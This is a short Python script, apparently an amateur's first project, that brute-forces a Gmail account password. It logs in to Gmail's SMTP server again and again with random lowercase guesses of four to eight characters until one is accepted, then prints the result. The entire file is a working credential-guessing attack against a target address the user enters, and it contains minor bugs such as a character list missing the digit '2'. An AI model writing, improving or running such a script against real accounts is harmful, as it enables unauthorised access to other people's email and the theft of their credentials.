from random import *
import os
import smtplib
from time import *
#################

print("\033[1;36mwelcom to my first script in python enjoy [+_+] ")

os.system("clear")
##########################

##########################
smtpserver=smtplib.SMTP('smtp.gmail.com','587')
smtpserver.ehlo()
smtpserver.starttls()
##########################
print("enter email and don't forget @gmail.com")
user_pass=input('>> ')

password=['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','0','1','3','4','5','6','7','8','9']
guess = ""
##########################

while True:
	guess=""
	
	for i in range(randint(4,8)):
		guess_letter = password[randint(0,25)]
		guess=str(guess_letter) +str(guess)
	
	try:
			smtpserver.login(user_pass,guess)
			print('\033[1;32m[+] thats it ',guess)
			print('congratulation ...')
			break;
	except smtplib.SMTPAuthenticationError:
			print('    \033[1;31m[-] not this                    [',guess,']')
			
print('\033[1;32mthe password is\033[1;34m ',guess,'\033[1;37m')
